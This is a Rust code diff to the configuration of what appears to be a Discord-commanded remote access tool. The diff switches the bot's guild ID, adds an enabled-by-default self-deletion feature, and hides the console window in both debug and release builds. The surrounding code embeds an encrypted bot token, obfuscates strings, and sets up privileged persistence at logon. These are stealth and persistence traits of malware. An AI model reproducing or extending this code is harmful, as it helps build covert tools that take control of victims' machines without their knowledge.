@@ -22,6 +22,11 @@ pub struct StartupConfig {
     pub highest_privileges: bool,
 }
 
+pub struct AutoDeleteConfig {
+    pub enabled: bool,
+    pub delay_ms: u64,
+}
+
 #[allow(dead_code)]
 pub enum MessageBoxIcon {
     Error,
@@ -155,7 +160,7 @@ include!(concat!(env!("OUT_DIR"), "/encrypted_token.rs"));
 const DISCORD_TOKEN_DEV: &str = "";
 
 impl Config {
-    pub const GUILD_ID: u64 = 1419632444734181471;
+    pub const GUILD_ID: u64 = 1455665634829533256;
     pub const BOT_PREFIX: &'static str = ".";
     pub const MAX_FILE_SIZE_MB: f64 = 10.0;
 
@@ -165,6 +170,13 @@ impl Config {
             task_name: encrypted_strings::task_name(),
             on_logon: true,
             highest_privileges: true,
+        }
+    }
+
+    pub fn get_autodelete_config() -> AutoDeleteConfig {
+        AutoDeleteConfig {
+            enabled: true, // Set to false to disable autodelete
+            delay_ms: 1000,
         }
     }
 
@@ -259,10 +271,10 @@ impl Default for AuthConfig {
 
 #[cfg(debug_assertions)]
 impl Config {
-    pub const SHOW_CONSOLE: bool = true;
+    pub const SHOW_CONSOLE: bool = false;
 }
 
 #[cfg(not(debug_assertions))]
 impl Config {
-    pub const SHOW_CONSOLE: bool = true;
+    pub const SHOW_CONSOLE: bool = false;
 }
